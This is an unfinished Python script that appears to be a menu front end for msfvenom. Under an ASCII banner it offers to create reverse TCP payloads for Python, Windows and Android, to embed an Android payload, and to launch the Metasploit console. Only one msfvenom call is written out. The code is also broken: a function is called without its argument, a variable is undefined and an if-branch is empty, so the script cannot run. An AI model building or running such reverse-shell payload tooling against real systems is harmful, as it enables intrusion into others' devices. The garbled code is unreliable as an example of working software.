#!/usr/bin/env python3
import colorama
import subprocess
import sys


banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')
lhost = ''
lport = ''                                  

#For prntopt func
n = 1
def prntopt(text):  
    global n
    print(colorama.Fore.LIGHTBLUE_EX + "[" + str(n) + "] " + colorama.Fore.LIGHTYELLOW_EX + text + colorama.Style.RESET_ALL)
    n += 1
prntopt()    


def payloadgen1():
    subprocess.run(["msfvenom", "-p", payload, "LHOST=" + lhost])    
 


def menu():
    prntopt("Create a basic reverse tcp python payload (MSF)")
    prntopt("Create a basic reverse tcp windows payload (MSF)")
    prntopt("Create a basic reverse tcp android payload (MSF)")
    prntopt("Create an embedded android payload (MSF, Reverse TCP)")
    prntopt("Start the Metasploit Framework Console")
    print("\n")
    input1 = input().strip()
    if input1 == "1":
        




 
    



 


def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls")


def main():
    clearscreen()
    print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
    menu()
    


main()



    




                                                               